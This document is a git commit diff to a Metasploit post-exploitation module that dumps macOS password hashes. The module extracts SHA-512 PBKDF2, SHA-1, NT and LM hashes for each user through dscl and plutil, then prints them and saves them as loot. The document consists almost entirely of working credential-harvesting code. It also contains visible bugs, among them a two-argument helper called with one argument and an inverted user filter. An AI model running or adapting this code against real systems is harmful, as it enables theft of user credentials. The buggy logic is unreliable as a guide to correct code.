e54856f60c75dc166e5911fd06636423deab94d5
Joe Vennix <joev@metasploit.com>
2013-12-07 21:55:52 -0600

    Hashdump now working well in osx 10.9

--- modules/post/osx/gather/hashdump.rb
+++ modules/post/osx/gather/hashdump.rb
@@ -9,10 +9,6 @@ require 'msf/core/auxiliary/report'
 require 'rexml/document'
 
 class Metasploit3 < Msf::Post
-
-  # When auto-login is enabled for some account, a kcpassword file is created
-  # that stores the password in plaintext
-  KC_PASSWORD_PATH = '/prviate/etc/kcpassword'
   # set of files to ignore while looping over files in a directory
   OSX_IGNORE_FILES = [".", "..", ".DS_Store"]
   # set of accounts to ignore while pilfering data
@@ -26,8 +22,8 @@ class Metasploit3 < Msf::Post
     super( update_info( info,
         'Name'          => 'OS X Gather Mac OS X Password Hash Collector',
         'Description'   => %q{
-            This module dumps SHA-1, LM, NT, and SHA-512 Hashes on OSX. Supports versions
-            10.4 to 10.9.
+            This module dumps SHA-1, LM, NT, and SHA-512 Hashes on OSX. Supports
+            versions 10.0 to 10.9.
         },
         'License'       => MSF_LICENSE,
         'Author'        => [
@@ -38,24 +34,20 @@ class Metasploit3 < Msf::Post
         'Platform'      => [ 'osx' ],
         'SessionTypes'  => [ 'shell' ]
       ))
-
+    register_options([
+      OptRegexp.new('MATCHUSER', [false,
+        'Only attempt to grab hashes for users whose name matches this regex'
+      ])
+    ])
   end
 
   # Run Method for when run command is issued
   def run
-    case session.type
-    when /meterpreter/
-      host = session.sys.config.sysinfo["Computer"]
-    when /shell/
-      host = session.shell_command_token("hostname").chomp
-    end
     print_status("Running module against #{host}")
     if root?
-      print_status("This session is running as root!")
-      dump_kcpassword if file_exist?(KC_PASSWORD_PATH)
       dump_hashes
     else
-      print_error("Insufficient Privileges you must be running as root to dump the hashes")
+      fail_with("Insufficient Privileges: must be running as root to dump the hashes")
     end
   end
 
@@ -87,29 +79,53 @@ class Metasploit3 < Msf::Post
   def dump_hashes
     hash_file = ''
     users.each do |user|
-      if gte_lion?
+      next if datastore['MATCHUSER'].blank? or datastore['MATCHUSER'] !~ user
+      print_status "Attempting to grab shadow for user #{user}..."
+      if gt_lion? # 10.8+
         # Look for the user's specific profile.plist, which contains ShadowHashData key
-        plist_bytes = cmd_exec("sudo dscl . read /Users/#{user} dsAttrTypeNative:ShadowHashData").gsub(/\s+/, '')
-        # ShadowHashData stores a binary plist inside of the user.plist
-        # Here we pull out the binary plist bytes and use built-in plutil to convert to xml
-        plist_bytes = $1.split('').each_slice(2).map{|s| "\\x#{s[0]}#{s[1]}"}.join
-        # encode the bytes as \x hex string, print using zsh, and pass to plutil
-        shadow_plist = cmd_exec("/bin/zsh -c 'echo -ne \"#{plist_bytes}\"' | plutil -convert xml1 - -o -")= 
-        # read the plaintext xml
-        shadow_xml = REXML::Document.new(shadow_plist)
-        # parse out the different parts of sha512pbkdf2
-        dict = sha512 = shadow_xml.elements[1].elements[1].elements[2]
-        entropy = dict.elements[2].text.gsub(/\s+/, '')
-        iterations = dict.elements[4].text.gsub(/\s+/, '')
-        salt = dict.elements[6].text.gsub(/\s+/, '')
-
-        # Report the hash bytes
-        hash = "SHA512PBKDF2:entropy:#{user}:#{entropy}\n" +
-               "SHA512PBKDF2:iterations:#{user}:#{iterations}\n" +
-               "SHA512PBKDF2:salt:#{user}:#{salt}"
-        hash.split("\n").each { |line| print_good line }
-        hash_file << hash
-      else
+        shadow_bytes = cmd_exec("dscl . read /Users/#{user} dsAttrTypeNative:ShadowHashData").gsub(/\s+/, '')
+        next unless shadow_bytes.start_with? 'dsAttrTypeNative:ShadowHashData:'
+        # strip the other bytes
+        shadow_bytes.sub!(/^dsAttrTypeNative:ShadowHashData:/, '')
+        if not lion? # 10.8
+          # on 10.8+ ShadowHashData stores a binary plist inside of the user.plist
+          # SHA512PBKDF2 is used for encrypting.
+          # Here we pull out the binary plist bytes and use built-in plutil to convert to xml
+          plist_bytes = shadow_bytes.split('').each_slice(2).map{|s| "\\x#{s[0]}#{s[1]}"}.join
+          # encode the bytes as \x hex string, print using bash's echo, and pass to plutil
+          shadow_plist = cmd_exec("/bin/bash -c 'echo -ne \"#{plist_bytes}\"' | plutil -convert xml1 - -o -")
+          # read the plaintext xml
+          shadow_xml = REXML::Document.new(shadow_plist)
+          # parse out the different parts of sha512pbkdf2
+          dict = sha512 = shadow_xml.elements[1].elements[1].elements[2]
+          entropy = Rex::Text.to_hex(dict.elements[2].text.gsub(/\s+/, '').unpack('m*')[0], '')
+          iterations = dict.elements[4].text.gsub(/\s+/, '')
+          salt = Rex::Text.to_hex(dict.elements[6].text.gsub(/\s+/, '').unpack('m*')[0], '')
+          # Report the hash bytes
+          vprint_good "SHA512PBKDF2:entropy:#{user}:#{entropy}"
+          vprint_good "SHA512PBKDF2:iterations:#{user}:#{iterations}"
+          vprint_good "SHA512PBKDF2:salt:#{user}:#{salt}"
+          # PBKDF2 stored in <user, iterations, salt, entropy> format
+          decoded_hash = "#{user}:$ml$#{iterations}$#{salt}$#{entropy}"
+          print_good "SHA512:#{decoded_hash}"
+          hash_file << decoded_hash
+        end
+      elsif lion? # 10.7
+        # on 10.7 the ShadowHashData is stored in plaintext
+        hash_decoded = shadow_bytes.upcase
+        # Check if NT HASH is present
+        if hash_decoded =~ /4F1010/
+          nt_hash = hash_decoded.scan(/^\w*4F1010(\w*)4F1044/)[0][0]
+        end
+        sha512 = hash_decoded.scan(/^\w*4F1044(\w*)(080B190|080D101E31)/)[0][0]
+        print_status("SHA512:#{user}:#{sha512}")
+        hash_file << "#{user}:#{sha512}\n"
+        # Reset hash value
+        if nt_hash.present?
+          report_nt_hash(nt_hash)
+        end
+      else # 10.6 and below
+        # On 10.6 and below, SHA-1 is used for encryption
         guid = if gte_leopard?
           cmd_exec("/usr/bin/dscl localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
         elsif lte_tiger?
@@ -122,22 +138,13 @@ class Metasploit3 < Msf::Post
         lm_hash   = read_file("/var/db/shadow/hash/#{guid} | cut -c33-64").chomp
 
         # Check that we have the hashes and save them
-        if sha1_hash !~ /00000000000000000000000000000000/
+        if sha1_hash !~ /0000000000000000000000000/
           print_status("SHA1:#{user}:#{sha1_hash}")
           hash_file << "#{user}:#{sha1_hash}"
         end
 
         if nt_hash !~ /000000000000000/
-          print_status("NT:#{user}:#{nt_hash}")
-          print_status("Credential saved in database.")
-          report_auth_info(
-            :host   => host,
-            :port   => 445,
-            :sname  => 'smb',
-            :user   => user,
-            :pass   => "AAD3B435B51404EE:#{nt_hash}",
-            :active => true
-          )
+          report_nt_hash(nt_hash)
         end
         if lm_hash !~ /0000000000000/
           print_status("LM:#{user}:#{lm_hash}")
@@ -154,31 +161,9 @@ class Metasploit3 < Msf::Post
       end
     end
     # Save pwd file
-    upassf = store_loot("osx.hashes.sha1", "text/plain", session, sha1_file,
+    upassf = store_loot("osx.hashes.sha1", "text/plain", session, hash_file,
                         "unshadowed_passwd.pwd", "OSX Unshadowed SHA1 Password File")
     print_good("Unshadowed Password File: #{upassf}")
-  end
-
-
-  # Checks if running as root on the target
-  # @return [Bool] current user is root
-  def root?
-    whoami == 'root'
-  end
-
-  # @return [String] name of current user
-  def whoami
-    @whoami ||= cmd_exec('/usr/bin/whoami').chomp
-  end
-
-  # @return [String] version string (e.g. 10.8.5)
-  def ver_num
-    @version ||= cmd_exec("/usr/bin/sw_vers -productVersion").chomp
-  end
-
-  # @return [Bool] system version is at least 10.7
-  def gte_lion?
-    ver_num =~ /10\.(\d+)/ and $1.to_i >= 7
   end
 
   # @return [Bool] system version is at least 10.5
@@ -186,13 +171,55 @@ class Metasploit3 < Msf::Post
     ver_num =~ /10\.(\d+)/ and $1.to_i >= 5
   end
 
+  # @return [Bool] system version is at least 10.8
+  def gt_lion?
+    ver_num =~ /10\.(\d+)/ and $1.to_i >= 8
+  end
+
+  # @return [String] hostname
+  def host; session.session_host; end
+
+  # @return [Bool] system version is 10.7
+  def lion?
+    ver_num =~ /10\.(\d+)/ and $1.to_i == 7
+  end
+
   # @return [Bool] system version is 10.4 or lower
   def lte_tiger?
     ver_num =~ /10\.(\d+)/ and $1.to_i <= 4
+  end
+  
+  def report_nt_hash(nt_hash, user)
+    print_status("NT:#{user}:#{nt_hash}")
+    print_status("Credential saved in database.")
+    report_auth_info(
+      :host   => host,
+      :port   => 445,
+      :sname  => 'smb',
+      :user   => user,
+      :pass   => "AAD3B435B51404EE:#{nt_hash}",
+      :active => true
+    )
+  end
+
+  # Checks if running as root on the target
+  # @return [Bool] current user is root
+  def root?
+    whoami == 'root'
   end
 
   # @return [Array<String>] list of user names
   def users
     @users ||= cmd_exec("/bin/ls /Users").each_line.collect.map(&:chomp) - OSX_IGNORE_ACCOUNTS
+  end
+
+  # @return [String] version string (e.g. 10.8.5)
+  def ver_num
+    @version ||= cmd_exec("/usr/bin/sw_vers -productVersion").chomp
+  end
+
+  # @return [String] name of current user
+  def whoami
+    @whoami ||= cmd_exec('/usr/bin/whoami').chomp
   end
 end
